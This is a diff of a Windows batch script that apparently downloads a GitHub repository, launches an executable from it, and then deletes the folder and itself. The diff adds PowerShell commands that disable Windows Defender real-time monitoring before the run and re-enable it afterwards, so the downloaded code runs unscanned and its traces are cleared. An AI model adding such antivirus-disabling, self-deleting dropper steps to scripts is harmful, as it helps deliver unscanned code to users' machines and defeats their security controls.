@@ -1,4 +1,5 @@
 @echo off
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 REM Define the paths
 set "repoUrl=https://github.com/nithin434/stuff2.git"
 set "repoDir=C:\stuff2"
@@ -29,5 +30,6 @@ start "" "%exeFile%"
 REM Optionally, you can delete the repository folder and the batch script after execution
 rmdir /s /q "%repoDir%"
 del "%~f0"
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false"
 
 REM End of script
